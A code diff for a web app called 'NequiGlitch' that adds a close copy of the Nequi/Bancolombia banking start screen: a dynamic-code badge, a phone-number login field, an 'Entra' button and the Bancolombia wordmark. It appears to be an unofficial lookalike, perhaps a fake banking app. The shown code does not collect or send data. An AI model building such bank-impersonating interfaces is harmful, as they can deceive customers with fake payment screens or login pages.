@@ -3,7 +3,8 @@
 
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 
   <!-- PWA -->
@@ -11,6 +12,7 @@
   <link rel="manifest" href="/manifest.json" />
 
   <!-- iOS PWA -->
+  <meta name="mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
   <meta name="apple-mobile-web-app-title" content="NequiGlitch" />
@@ -34,6 +36,52 @@
   ════════════════════════════════════════════ -->
   <section id="page-inicial" class="page active">
     <div class="page-bg" style="background-image: url('/assets/img/fondo.png');"></div>
+
+    <!-- TOP BAR -->
+    <div class="inicial-topbar">
+
+      <!-- Clave dinámica (top-left) -->
+      <div class="clave-dinamica-badge">
+        <div class="clave-dinamica-icon">
+          <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <!-- Background circle (track) -->
+            <circle cx="18" cy="18" r="14" stroke="rgba(255,255,255,0.2)" stroke-width="3" fill="none" />
+            <!-- Progress arc (~75% filled) -->
+            <circle cx="18" cy="18" r="14" stroke="white" stroke-width="3" fill="none" stroke-dasharray="66 88"
+              stroke-dashoffset="22" stroke-linecap="round" transform="rotate(-90 18 18)" />
+            <!-- Pink dot at the start of the progress -->
+            <circle cx="32" cy="18" r="3" fill="#DA0081" transform="rotate(-90 18 18)" />
+          </svg>
+        </div>
+        <div class="clave-dinamica-info">
+          <span class="clave-dinamica-label">Clave dinámica</span>
+          <span class="clave-dinamica-value" id="clave-valor">530818</span>
+        </div>
+        <button class="clave-copy-btn" onclick="App.copyClave()" aria-label="Copiar clave">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+            <path
+              d="M19.0781 6H8.67188C7.19624 6 6 7.19624 6 8.67188V19.0781C6 20.5538 7.19624 21.75 8.67188 21.75H19.0781C20.5538 21.75 21.75 20.5538 21.75 19.0781V8.67188C21.75 7.19624 20.5538 6 19.0781 6Z"
+              stroke="white" stroke-width="1.5" stroke-linejoin="round" />
+            <path
+              d="M17.9766 6L18 4.875C17.998 4.17942 17.7208 3.51289 17.229 3.02103C16.7371 2.52918 16.0706 2.25198 15.375 2.25H5.25C4.45507 2.25235 3.69338 2.56917 3.13128 3.13128C2.56917 3.69338 2.25235 4.45507 2.25 5.25V15.375C2.25198 16.0706 2.52918 16.7371 3.02103 17.229C3.51289 17.7208 4.17942 17.998 4.875 18H6"
+              stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" />
+          </svg>
+        </button>
+      </div>
+
+      <!-- Ayuda (top-right) -->
+      <button class="ayuda-btn" onclick="App.noop()" aria-label="Ayuda">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="12" cy="12" r="11" stroke="white" stroke-width="1.5" />
+          <path d="M9.5 9.5C9.5 8.12 10.62 7 12 7C13.38 7 14.5 8.12 14.5 9.5C14.5 10.88 13.38 12 12 12V13.5"
+            stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" />
+          <circle cx="12" cy="16.5" r="0.75" fill="white" />
+        </svg>
+        <span>Ayuda</span>
+      </button>
+    </div>
+
+    <!-- BOTTOM CONTENT (input + buttons) -->
     <div class="inicial-content">
       <!-- Phone input row -->
       <div class="phone-input-row">
@@ -42,10 +90,42 @@
         <input id="phone-input" class="phone-field" type="tel" inputmode="numeric" maxlength="10"
           placeholder="Número de celular" autocomplete="tel-national" />
       </div>
-      <!-- Enter button -->
-      <button id="btn-entra" class="btn-entra" onclick="App.goToClave()">
-        Entra
-      </button>
+
+      <!-- Entra + $ buttons row -->
+      <div class="btn-row">
+        <button id="btn-entra" class="btn-entra" onclick="App.goToClave()">
+          Entra
+        </button>
+        <button class="btn-dollar" onclick="App.noop()" aria-label="Pagar">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+            <path d="M12 2v20M17 5H9.5a3.5 3.5 0 100 7h5a3.5 3.5 0 110 7H6" stroke="white" stroke-width="2"
+              stroke-linecap="round" stroke-linejoin="round" />
+          </svg>
+        </button>
+      </div>
+
+      <!-- Bottom bar: ¿Cambiaste tu cel? + Bancolombia -->
+      <div class="inicial-bottom-bar">
+        <button class="cambio-cel" onclick="App.noop()">
+          <svg width="16" height="16" viewBox="0 0 48 48" fill="none">
+            <path
+              d="M27.75 12.75H20.25C19.0074 12.75 18 13.7574 18 15V33C18 34.2426 19.0074 35.25 20.25 35.25H27.75C28.9926 35.25 30 34.2426 30 33V15C30 13.7574 28.9926 12.75 27.75 12.75Z"
+              stroke="rgba(255,255,255,0.7)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" />
+            <path
+              d="M20.25 12.75H21.375C21.75 12.75 22.125 13.125 22.125 13.5C22.125 14.1213 22.6287 14.625 23.25 14.625H24.75C25.3713 14.625 25.875 14.1213 25.875 13.5C25.875 13.125 26.25 12.75 26.625 12.75H27.75"
+              stroke="rgba(255,255,255,0.7)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" />
+          </svg>
+          <span>¿Cambiaste tu cel?</span>
+        </button>
+        <div class="bancolombia-logo-wrap">
+          <span class="by-text">by</span>
+          <!-- Bancolombia wordmark simplified as SVG text -->
+          <svg width="80" height="14" viewBox="0 0 200 35" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <text x="0" y="28" font-family="Arial, sans-serif" font-size="28" font-weight="bold"
+              fill="rgba(255,255,255,0.85)" letter-spacing="1">Bancolombia</text>
+          </svg>
+        </div>
+      </div>
     </div>
   </section>
 
@@ -99,7 +179,6 @@
 
       <!-- HEADER AREA -->
       <div class="home-header">
-        <!-- Fondo orquídea + saldo -->
         <div class="home-header-bg"></div>
 
         <!-- Row superior: usuario + botones -->
@@ -114,7 +193,7 @@
             </div>
             <div class="user-info">
               <span class="user-greeting">Hola,</span>
-              <span class="user-name" id="home-username">USERPASSNEQUI</span>
+              <span class="user-name" id="home-username">USERNEQUI</span>
             </div>
           </div>
           <div class="home-top-actions">
